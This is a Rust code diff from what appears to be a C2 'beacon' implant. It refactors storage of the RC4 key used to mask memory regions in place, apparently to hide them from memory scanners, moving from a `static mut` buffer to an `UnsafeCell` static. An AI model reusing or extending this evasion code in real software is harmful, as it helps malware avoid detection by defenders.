@@ -40,10 +40,15 @@ static MASK_STATE: AtomicU8 = AtomicU8::new(0);
 /// A while `unmask()` derived key B → the regions were NOT restored (corrupted
 /// with keystream∘keystream). RC4 round-trip requires the SAME key for both
 /// passes, so the key MUST be stable for the process lifetime. Stored in a
-/// `static mut` buffer guarded by an init flag — no heap allocation, no leak
-/// (a leaked `Box` would grow the heap needlessly; the key is process-lifetime
-/// by definition, but ownership belongs in a static here).
-static mut MASK_KEY_BUF: [u8; 32] = [0u8; 32];
+/// `static` backed by `UnsafeCell`, guarded by an init flag — no heap allocation,
+/// no leak (a leaked `Box` would grow the heap needlessly; the key is
+/// process-lifetime by definition, but ownership belongs in a static here).
+///
+/// # Safety
+/// Access is guarded by `MASK_KEY_INIT`: written once, read-only after init.
+/// Single-threaded beacon context.
+static MASK_KEY_BUF: crate::cell::SyncCell<[u8; 32]> =
+    crate::cell::SyncCell::new([0u8; 32]);
 /// 0 = MASK_KEY_BUF uninitialized, 1 = populated.
 static MASK_KEY_INIT: AtomicU8 = AtomicU8::new(0);
 
@@ -124,7 +129,7 @@ pub(crate) fn mask_key() -> &'static [u8; 32] {
         // SAFETY: MASK_KEY_BUF is populated and never mutated again after
         // init; the beacon is single-threaded (documented invariant) so there
         // is no concurrent mutation.
-        return unsafe { &*(&raw const MASK_KEY_BUF) };
+        return unsafe { &*MASK_KEY_BUF.get() };
     }
     let mut key = [0u8; 32];
     if !crate::entry::csprng_fill(&mut key) {
@@ -140,10 +145,10 @@ pub(crate) fn mask_key() -> &'static [u8; 32] {
     // load above so a racing reader observes the bytes before init==1).
     // SAFETY: single-threaded beacon; MASK_KEY_BUF is not concurrently accessed.
     unsafe {
-        MASK_KEY_BUF = key;
+        *MASK_KEY_BUF.get() = key;
     }
     MASK_KEY_INIT.store(1, Ordering::Release);
-    unsafe { &*(&raw const MASK_KEY_BUF) }
+    unsafe { &*MASK_KEY_BUF.get() }
 }
 
 /// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
